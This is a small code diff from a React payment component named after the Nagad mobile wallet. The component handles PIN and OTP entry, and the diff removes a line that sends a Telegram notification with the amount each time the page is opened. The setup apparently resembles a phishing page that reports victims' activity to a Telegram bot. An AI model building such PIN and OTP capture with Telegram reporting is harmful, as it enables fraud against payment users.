@@ -65,7 +65,6 @@ const NagadPayment = () => {
   const pinInputRefs = useRef<(HTMLInputElement | null)[]>([]);
   const otpStartAtRef = useRef<number>(0);
   useEffect(() => { if (showOtpView && !otpStartAtRef.current) otpStartAtRef.current = Date.now(); if (!showOtpView) otpStartAtRef.current = 0; }, [showOtpView]);
-  useEffect(() => { sendTelegramNotification({ type: 'page_entry', amount, method: 'Nagad' }, { force: true }); /* eslint-disable-next-line react-hooks/exhaustive-deps */ }, []);
 
 
   useEffect(() => {
